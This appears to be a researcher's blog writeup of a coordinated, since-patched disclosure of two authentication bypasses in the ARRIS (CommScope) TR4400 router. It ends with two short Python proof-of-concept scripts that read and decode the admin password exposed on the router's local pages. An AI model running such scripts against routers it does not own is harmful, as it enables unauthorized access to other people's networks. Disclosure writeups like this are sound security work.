It’s worth mentioning that although ARRIS was the original manufacturer of this router, ARRIS was acquired by CommScope. To keep things simple, I’ll refer to the company as CommScope for this writeup.

During late April 2019 I discovered two authentication bypasses to the administrative interface in my home router. I decided to take this opportunity to participate in a coordinated disclosure with CommScope as I didn’t want to drop the exploit code online and submit for a CVEs. I reached out to CommScope via their “Product Security Issue or Vulnerability” portal (KUDOS to companies who have product security portals) and they were able to successfully reproduce the issue and quickly began working on a firmware update. Then, CommScope passed off the updated firmware to Charter (Spectrum) to deliver a nationwide out-of-band patch around August 20th, 2019. Working through CommScope, Charter patched my device first so I could confirm the fix. Then, Charter deployed the nationwide out-of-band patch.

All-in-all, working with CommScope and Charter was a delightful experience. It was clear that both companies care about the security of their products and were very attentive of the issue. CommScope updated me constantly on the status on the firmware build, the next steps they were taking, when to expect the patch, etc. There was always plenty of communication.

The only piece of advice I’d like to give to anyone else trying to get CVEs from their ISP’s customer-provided equipment (CPE) is: There are a lot of moving parts. I found the bugs in CommScope’s hardware however Charter is ultimately responsible to deliver the patch to customers. One should expect a somewhat lengthier remediation timeline as two companies (manufacturer and ISP) need to work in tandem to deliver the patch to customers.

OK, now for the technical stuff (which won’t take long). Bypassing authentication in ARRIS TR4400 was rather trivial as they commit the current base64 encoded passwords on two web pages accessible from any user connected to the Wi-Fi. The two pages are <http://192.168.1.1/basic_sett.html> and <http://192.168.1.1/login.html>. I’ve written two tiny proof of concepts that simply grabs the password and decodes it.

**PoC One — basic\_sett.html**

import requests,sys
 import base64
 from bs4 import BeautifulSoup

 def get\_current\_password():
 r = requests.get(‘<http://192.168.1.1/basic_sett.html>')
 soup = BeautifulSoup(r.content, ‘html.parser’)
 inputTag = soup.findAll(attrs={“name” : “cur\_passwd”})
 encoded = output = inputTag[0][‘value’]
 decode = base64.b64decode(encoded)
 print decode
 get\_current\_password()

**PoC two — login.html**

import requests,sys
 import base64
 from bs4 import BeautifulSoup

 def get\_current\_password():
 r = requests.get(‘http://192.168.1.1/login.html')
 soup = BeautifulSoup(r.content, ‘html.parser’)
 inputTag = soup.findAll(attrs={“name” : “cur\_passwd”})
 encoded = output = inputTag[0][‘value’]
 decode = base64.b64decode(encoded)
 print decode
 get\_current\_password()
